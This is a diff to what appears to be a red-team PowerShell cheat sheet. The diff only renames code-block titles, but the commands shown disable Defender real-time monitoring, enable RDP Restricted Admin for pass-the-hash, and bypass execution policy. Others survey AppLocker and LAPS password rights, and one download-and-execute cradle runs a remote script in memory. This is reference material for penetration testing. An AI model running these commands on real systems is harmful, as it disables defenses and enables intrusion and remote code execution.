@@ -6,7 +6,7 @@
 
 Loosen execution policy at the user scope so unsigned scripts run without prompts.
 
-```sh title:"Loosen execution policy at user scope, no prompts"
+```sh title:"Powershell Loosen execution policy at user scope, no prompts"
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
 ```
 <!-- cheat -->
@@ -15,7 +15,7 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
 
 Flip the registry bit that allows RDP Restricted Admin (lets PtH reach RDP without sending a password).
 
-```sh title:"Allow RDP Restricted Admin (PtH-style RDP login)"
+```sh title:"Powershell Allow RDP Restricted Admin (PtH-style RDP login)"
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 <!-- cheat -->
@@ -24,7 +24,7 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 
 Disable Defender real-time monitoring. Requires admin and Tamper Protection disabled.
 
-```sh title:"Disable Defender RTP (needs admin, no Tamper Protection)"
+```sh title:"Powershell Disable Defender RTP (needs admin, no Tamper Protection)"
 Set-MpPreference -DisableRealTimeMonitoring $true
 ```
 <!-- cheat -->
@@ -33,7 +33,7 @@ Set-MpPreference -DisableRealTimeMonitoring $true
 
 Query Defender status: signature age, RTP state, AMSI state.
 
-```sh title:"Read Defender status, signature age, RTP/AMSI state"
+```sh title:"Powershell Read Defender status, signature age, RTP/AMSI state"
 Get-MpComputerStatus
 ```
 <!-- cheat -->
@@ -51,7 +51,7 @@ Install-WindowsFeature RSAT-AD-PowerShell
 
 Install all RSAT capabilities on a Windows desktop SKU (Win10/11).
 
-```sh title:"Install all RSAT capabilities on Windows desktop"
+```sh title:"Powershell Install all RSAT capabilities on Windows desktop"
 Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
 ```
 <!-- cheat -->
@@ -60,7 +60,7 @@ Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
 
 Load the AD module into the current session so Get-ADUser etc. resolve.
 
-```sh title:"Load AD module so Get-AD* resolves"
+```sh title:"Powershell Load AD module so Get-AD* resolves"
 Import-Module ActiveDirectory
 ```
 <!-- cheat -->
@@ -69,7 +69,7 @@ Import-Module ActiveDirectory
 
 Pull the effective AppLocker rules. Read this before dropping binaries on locked-down hosts.
 
-```sh title:"Effective AppLocker rules, read before dropping bins"
+```sh title:"Powershell Effective AppLocker rules, read before dropping bins"
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 <!-- cheat -->
@@ -78,7 +78,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 Identify groups delegated to read LAPS passwords. From the LAPS PowerShell module.
 
-```sh title:"Groups delegated to read LAPS passwords"
+```sh title:"Powershell Groups delegated to read LAPS passwords"
 Find-LAPSDelegatedGroups
 ```
 <!-- cheat -->
@@ -87,7 +87,7 @@ Find-LAPSDelegatedGroups
 
 Find principals with extended rights to read LAPS-managed `ms-Mcs-AdmPwd`.
 
-```sh title:"Principals with extended rights to read ms-Mcs-AdmPwd"
+```sh title:"Powershell Principals with extended rights to read ms-Mcs-AdmPwd"
 Find-AdmPwdExtendedRights
 ```
 <!-- cheat -->
@@ -96,7 +96,7 @@ Find-AdmPwdExtendedRights
 
 List computer objects that have a LAPS password set.
 
-```sh title:"List computer objects with LAPS password set"
+```sh title:"Powershell List computer objects with LAPS password set"
 Get-LAPSComputers
 ```
 <!-- cheat -->
@@ -114,7 +114,7 @@ Get-Module
 
 Show effective execution policy for every scope.
 
-```sh title:"Show execution policy for every scope"
+```sh title:"Powershell Show execution policy for every scope"
 Get-ExecutionPolicy -List
 ```
 <!-- cheat -->
@@ -123,7 +123,7 @@ Get-ExecutionPolicy -List
 
 Bypass execution policy for the current process only (most reversible setting).
 
-```sh title:"Bypass execution policy for current process only"
+```sh title:"Powershell Bypass execution policy for current process only"
 Set-ExecutionPolicy Bypass -Scope Process
 ```
 <!-- cheat -->
@@ -132,7 +132,7 @@ Set-ExecutionPolicy Bypass -Scope Process
 
 Classic in-memory script loader: download a remote `.ps1` and pipe straight into Invoke-Expression.
 
-```sh title:"In-memory download + Invoke-Expression of remote .ps1"
+```sh title:"Powershell In-memory download + Invoke-Expression of remote .ps1"
 iex(New-Object Net.WebClient).DownloadString('$URL')
 ```
 <!-- cheat
